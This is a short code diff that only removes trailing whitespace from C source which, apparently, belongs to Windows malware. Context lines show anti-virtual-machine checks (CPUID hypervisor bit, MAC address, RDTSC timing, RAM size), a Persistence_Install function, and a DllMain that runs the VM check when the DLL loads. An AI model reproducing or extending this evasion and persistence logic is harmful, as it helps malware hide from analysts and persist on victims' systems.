@@ -25,7 +25,7 @@
 static bool Check_CPUID(void) {
     int cpuInfo[4] = {0};
     __cpuid(cpuInfo, 1);
-    return (cpuInfo[2] >> 31) & 1; 
+    return (cpuInfo[2] >> 31) & 1;
 }
 
 static bool Check_MAC(void) {
@@ -70,7 +70,7 @@ static bool Check_RDTSC_Timing(void) {
     uint64_t t1 = __rdtsc();
     Sleep(10);
     uint64_t t2 = __rdtsc();
-    return (t2 - t1) < 1000000; 
+    return (t2 - t1) < 1000000;
 }
 
 static bool Check_RAM_Size(void) {
@@ -161,7 +161,7 @@ bool Persistence_Install(void) {
 #ifdef _WINDLL
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
-        // 
+        //
         AntiVM_IsVirtualMachine();
     }
     return TRUE;
